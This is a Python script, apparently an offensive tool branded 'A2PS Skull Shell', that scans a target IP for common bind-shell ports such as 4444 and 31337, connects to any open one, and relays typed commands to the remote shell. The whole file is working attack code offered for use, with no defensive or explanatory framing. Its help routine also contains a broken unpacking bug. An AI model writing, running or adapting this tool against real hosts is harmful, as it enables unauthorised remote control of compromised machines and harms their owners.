import os
import sys
import socket
from time import sleep
from rich.table import Table
from termcolor import colored
from rich.console import Console

console = Console()
shell_ports = (22, 23, 1337, 4443, 4444, 5555, 9999, 31337)
commands = {
    "exit": "Exit the shell",
    "quit": "Exit the shell",
    "cls": "Clear the screen",
    "help": "Show the usage page",
}

def show_banner():
    banner1 = """
                 u$$$$$$$$$uu
               u$$$$$$$$$$$$$$u
              u$$$$$$$$$$$$$$$$u
             u$$$$$$$$$$$$$$$$$$u
             u$$$$*   *$*   *$$$$u
             *$$$*     u$u     $$$*
              $$u      u$u     u$$
              $$u     u$$$u    u$$
               *$$$u$$$  $$$u$$$*
                *$$$$$*  *$$$$$*
                  u$$$$$$$$$$u
                   u$*$*$*$*$u
         uu        $$u$ $ $u$$       uu
         u$$$      $$$$$u$u$$$      u$$$
         $$$$uu     *$$$$$$$*    uu$$$$$
        $$$$$$$$$uu   ***   uuu$$$$$$$$$
        $$$***$$$$$$$uuuuuu$$$$$$$***$$$
         **      **$$$$$$$$$**$***
                uuuu**$$$$$$$uuu
        u$$$uu$$$$$$$uu**$$$$$$$uuu$$$
        $$$$$$$$****      **$$$$$$$$$
          *$$$$*              **$$$$
            $$*                 $$$*
    """
    banner2 = colored("        [*] Connecting to 192.168.3.75...", "yellow")
    banner3 = colored("        [+] Connecting ESTABLISHED!", "green")
    banner4 = colored("    ☠️ Welcome to A2PS Skull Shell ☠️", "red")
    banner5 = (colored("    ┌──(", "cyan") + colored("skull㉿shell", "red") + colored(")-[", "cyan") + colored(
        "root/kali/Desktop", "white") + colored(']', "cyan"))
    banner6 = colored("    └─", "cyan") + colored('#', "red") + colored(" cat", "blue") + colored(" data.json", "white")
    print(banner1)
    print(banner2)
    print(banner3)
    print(banner4)
    print(banner5)
    print(banner6, '\n    ------------------------------------')
    print(colored("    [💀] Script mode: ", "light_yellow") + colored("🔴 Red SWAT", "red"))
    print(colored("    [💀] Function: ", "light_yellow") + colored("Use bind-shell\n", "red"))


def scan_shell_ports(targetIP):
    available_shell_ports = []
    table = Table()
    table.add_column("Opened bind-shell ports", style="yellow")

    for port in shell_ports:
        sock = socket.socket()
        sock.settimeout(0.02)
        try:
            sock.connect((targetIP, port))
            available_shell_ports.append(port)
            table.add_row(str(port))
        except:
            pass
        finally:
            sock.close()

    if available_shell_ports:
        console.print(table)
        return available_shell_ports
    else:
        print(colored("[-] No bind-shell ports available", "red"))
        return []


def launch_shell(targetIP, port):
    print(colored(f"[*] Connecting to {targetIP} through the port {port}...", "yellow"))
    sock = socket.socket()
    sock.settimeout(3)
    try:
        sock.connect((targetIP, port))
        sleep(1.5)
        print(colored(f"[+] Connecting ESTABLISHED!", "green"))
        print(colored("    ☠️ Welcome to A2PS Skull Shell ☠️", "red"))
        while True:
            cmd = input(
                colored("┌──(", "cyan") + colored("skull㉿shell", "red") + colored(')-[', "cyan") + colored(targetIP,
                                                                                                         "light_yellow") + colored(':', "white") + colored(
                    port, "light_yellow") + colored(']', "cyan") + colored("\n└─", "cyan") + colored("# ", "white"))
            if cmd in ["exit", "quit"]:
                break
            elif cmd == "help":
                print(colored("Available commands", "white"))
                for id, comd, desc in enumerate(commands.items(), start=1):
                    print(str(id) + colored(comd, "yellow") + ': ' + colored(desc, "white"))
                continue
            elif cmd == "cls":
                os.system("cls" if os.name == "nt" else "clear")
            sock.send(cmd.encode() + b"\n")
            response = sock.recv(4096).decode(errors="ignore")
            print(response)
    except:
        print(colored("[-] Connection failed", "red"))
    finally:
        sock.close()


show_banner()
if len(sys.argv) > 1:
    target = sys.argv[1]
else:
    target = input(colored("[*] Enter the target IP: ", "yellow"))

ports = scan_shell_ports(target)

if len(ports) > 1:
    print(colored(f"[+] {len(ports)} ports are available:", "green"))
    for id, port in enumerate(ports, start=1):
        print(colored(f"    {id}.{port}", "cyan"))
    selected_port = int(input(colored("[*] Select port from available: ", "yellow")))
    launch_shell(target, selected_port)
elif len(ports) == 1:
    print(colored(f"[+] Only the port {ports[0]} is available!", "green"))
    launch_shell(target, ports[0])
